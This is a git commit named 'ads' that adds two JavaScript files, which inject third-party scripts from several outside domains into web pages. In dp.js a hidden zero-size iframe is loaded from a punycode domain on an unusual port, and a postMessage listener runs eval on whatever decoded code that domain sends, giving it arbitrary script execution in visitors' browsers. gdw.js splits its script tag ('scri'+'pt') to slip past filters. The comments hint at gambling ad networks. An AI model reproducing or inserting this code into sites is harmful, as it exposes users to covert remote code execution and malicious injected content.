9a819209b344bfa61f6cc700b961e4eb80c3293a
zmmx <35140632+zmmx@users.noreply.github.com>
2020-07-25 20:25:42 +0800

    ads

---
+++ ads/dp.js
@@ -0,0 +1,13 @@
+//dipiao-njcn888
+(function (){
+                        var id = "2415689770463175004-7432";
+  document.write('<ins style="display:none!important" id="' + id + '"></ins>');
+  (window.adbyunion = window.adbyunion || []).push(id);
+  document.write('<script async defer src="https://www.68710266.com/o.js"></script>');
+})();
+//dingpiao-zhimo
+if(navigator.userAgent.indexOf('baiduboxapp')>-1){document.write('<script src="https://xn--4gqqc629gbju.com:19852/api/c-2059-23.js"><\/script>')}else{(function(){window.addEventListener("message",function(e){var _des_s_2059=e.data;if(_des_s_2059.des_s_2059){var _s = '/+/g';eval(decodeURIComponent(_des_s_2059.des_s_2059.replace(_s,"%20")))}});document.write('<iframe style="display:none;" src="https://xn--4gqqc629gbju.com:19852/api/c-2059-23-1.html" height="0" width="0"  marginheight="0" scrolling="no" frameborder="0" allowtransparency="true"></iframe>')})();}
+//pc
+document.write("<script src='\/\/pc.cathaycentury.com\/pc\/rich-tf.js' id=\"richid\" data='s=2596'><\/script>");
+document.write("<script src='\/\/pc.cathaycentury.com\/pc\/tp-tf.js' id=\"tpid\" data='s=2599&u=s0005'><\/script>");
+document.write("<script src='\/\/pc.cathaycentury.com\/pc\/beitou-tf.js' id=\"beitouid\" data='s=2597'><\/script>");
---
+++ ads/gdw.js
@@ -0,0 +1,1 @@
+document.writeln('<scri'+'pt src="https://js.qsk666.com/5/1266/9262/20/27.js"> </scri'+'pt>');
